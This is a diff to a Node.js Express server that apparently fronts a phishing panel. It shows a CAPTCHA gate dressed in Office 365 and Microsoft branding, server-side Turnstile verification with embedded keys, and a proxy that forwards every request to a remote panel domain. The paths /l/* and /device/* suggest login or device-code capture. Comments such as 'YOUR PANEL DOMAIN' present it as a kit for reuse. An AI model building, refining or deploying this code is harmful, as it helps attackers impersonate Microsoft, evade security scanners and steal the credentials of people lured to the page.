@@ -4,11 +4,15 @@ const crypto = require('crypto');
 const app = express();
 const port = process.env.PORT || 3000;
 
+// ⚠️ YOUR PANEL DOMAIN (change if different)
 const PANEL_DOMAIN = 'portal42-343.sbs';
+
+// ⚠️ YOUR RENDER URL (change to your actual Render URL)
 const RENDER_URL = 'https://shared-documents.onrender.com';
 
-// ⚠️ USE YOUR OWN SITE KEY (from Cloudflare)
-const TURNSTILE_SITEKEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
+// ⚠️ YOUR CLOUDFLARE TURNSTILE KEYS (replace with your own)
+const TURNSTILE_SITEKEY = '0x4AAAAAAAAEs9a3e6xuicWrZa';
+const TURNSTILE_SECRET = '0x4AAAAAAAAEs9ayeKqC1MX6dKR--8FLZtOJE';
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -18,14 +22,17 @@ function generateToken() {
     return crypto.randomBytes(32).toString('hex');
 }
 
+// Middleware: check CAPTCHA verification
 function requireCaptcha(req, res, next) {
     const token = req.cookies.captcha_token;
     if (token && token === req.cookies.captcha_verified) {
         return next();
     }
+    // Show the CAPTCHA page
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 }
 
+// 🔥 The CAPTCHA Page (with animated Office 365 logo, NO "Continue" button)
 app.get('/captcha', (req, res) => {
     const returnUrl = req.query.return || '/';
     res.send(`
@@ -34,7 +41,7 @@ app.get('/captcha', (req, res) => {
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Redirect</title>
+  <title>Verify</title>
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
   <style>
     body {
@@ -54,12 +61,8 @@ app.get('/captcha', (req, res) => {
       text-align: center;
       max-width: 400px;
     }
-    .error { color: #d32f2f; padding: 20px; background: #ffebee; border-radius: 4px; }
+    .error { color: #d32f2f; padding: 10px; background: #ffebee; border-radius: 4px; display: none; }
     #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
-    #contBtn {
-      margin:20px auto; display:block; padding:12px 20px; background:#32a0da; color:#fff; border:none;
-      border-radius:4px; font-size:15px; font-weight:600; font-family:'Segoe UI', Arial, sans-serif; cursor:pointer;
-    }
     :root {
       --s: 180px; --envW: 130px; --envH: 71px; --calW: 118px; --sqW: calc(var(--calW)/3); --sqH: 37px;
       --calHH: 20px; --calH: calc(var(--sqH)*3 + var(--calHH)); --calY: calc(var(--calH) + 20px);
@@ -90,8 +93,8 @@ app.get('/captcha', (req, res) => {
     .flapTriangle { width: 96px; height: 96px; background: #50d9ff; margin: -48px auto 0 auto; border-radius: 7px; transform: scaleY(.6) rotate(45deg); }
     #openedFlap .flapTriangle { background: #123b6d; }
     #closedFlap .flapTriangle { background: #50d9ff; }
-    #dp { margin-top: 20px; }
-    .hide { display: none; }
+    #dp { margin-top: 20px; color: #5e5e5e; }
+    .footer { font-size: 12px; color: #6c6c6c; margin-top: 30px; border-top: 1px solid #e1e1e1; padding-top: 20px; }
   </style>
 </head>
 <body>
@@ -116,18 +119,13 @@ app.get('/captcha', (req, res) => {
       </div>
     </div>
     <div id="dp"></div>
-    <div style="display:none" id="cont">
-      <h3>Your document is ready.</h3>
-      <p>This document is protected to help safeguard its contents. Before it can be viewed, you'll be asked to complete a brief verification step. Select Continue to proceed and follow the instructions.</p>
-      <button class="primary" id="contBtn" onclick="window.location.href='${RENDER_URL}${returnUrl}'">Continue</button>
-    </div>
     <div id="cf-turnstile"></div>
-    <div id="status"></div>
-    <img src="https://res.cdn.office.net/assets/framework/microsoft.svg" id="MSLogo" alt="MS">
+    <div id="status" class="error"></div>
+    <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
   </div>
   <script>
-    const targetUrl = "${RENDER_URL}${returnUrl}";
-    const messages = ["Loading...", "Processing request...", "Preparing results...", "Almost there...", "Finalizing..."];
+    const returnUrl = "${returnUrl}";
+    const messages = ["Loading...", "Processing request...", "Almost there...", "Finalizing..."];
     let index = 0;
     function cycleMessages() {
       document.getElementById("dp").textContent = messages[index];
@@ -138,12 +136,27 @@ app.get('/captcha', (req, res) => {
 
     function turnstileCallback(token) {
       if (token) {
-        // ✅ ALWAYS SUCCEED (bypass verification for testing)
-        document.getElementById("loadingLogo").style.display = "none";
-        document.getElementById("dp").style.display = "none";
-        document.getElementById("status").style.display = "none";
-        document.getElementById("cf-turnstile").style.display = "none";
-        document.getElementById("cont").style.display = "block";
+        // Send to server for verification
+        fetch('/verify-captcha', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token: token, returnUrl: returnUrl })
+        })
+        .then(r => r.json())
+        .then(data => {
+          if (data.success) {
+            window.location.href = data.redirect;
+          } else {
+            document.getElementById("status").textContent = "Verification failed. Please try again.";
+            document.getElementById("status").style.display = "block";
+            turnstile.reset();
+          }
+        })
+        .catch(() => {
+          document.getElementById("status").textContent = "Network error. Please try again.";
+          document.getElementById("status").style.display = "block";
+          turnstile.reset();
+        });
       }
     }
 
@@ -170,11 +183,40 @@ app.get('/captcha', (req, res) => {
     `);
 });
 
+// Server-side verification endpoint
+app.post('/verify-captcha', async (req, res) => {
+    const { token, returnUrl } = req.body;
+    if (!token) return res.json({ success: false, error: 'Missing token' });
+
+    try {
+        const form = new URLSearchParams();
+        form.append('secret', TURNSTILE_SECRET);
+        form.append('response', token);
+
+        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+            method: 'POST',
+            body: form
+        });
+        const data = await response.json();
+
+        if (data.success) {
+            const t = generateToken();
+            res.cookie('captcha_token', t, { maxAge: 3600000, httpOnly: true, secure: true });
+            res.cookie('captcha_verified', t, { maxAge: 3600000, httpOnly: true, secure: true });
+            return res.json({ success: true, redirect: returnUrl || '/' });
+        }
+        return res.json({ success: false, error: 'Invalid token' });
+    } catch (e) {
+        console.error('Verification error:', e);
+        return res.json({ success: false, error: 'Server error' });
+    }
+});
+
 // Protect /l/* and /device/* with CAPTCHA
 app.use('/l/*', requireCaptcha);
 app.use('/device/*', requireCaptcha);
 
-// Main Proxy
+// The Main Proxy (serves the actual content)
 app.use('*', async (req, res) => {
     try {
         const targetUrl = new URL(req.originalUrl, `https://${PANEL_DOMAIN}`);
@@ -183,7 +225,9 @@ app.use('*', async (req, res) => {
         headers.delete('host');
 
         const opts = { method: req.method, headers: headers };
-        if (req.method !== 'GET' && req.method !== 'HEAD') opts.body = req.body;
+        if (req.method !== 'GET' && req.method !== 'HEAD') {
+            opts.body = req.body;
+        }
 
         const response = await fetch(targetUrl.toString(), opts);
         const body = await response.text();
@@ -191,6 +235,7 @@ app.use('*', async (req, res) => {
 
         res.status(response.status).set('Content-Type', contentType).send(body);
     } catch (e) {
+        console.error('Proxy error:', e);
         res.status(500).send('Proxy Error');
     }
 });
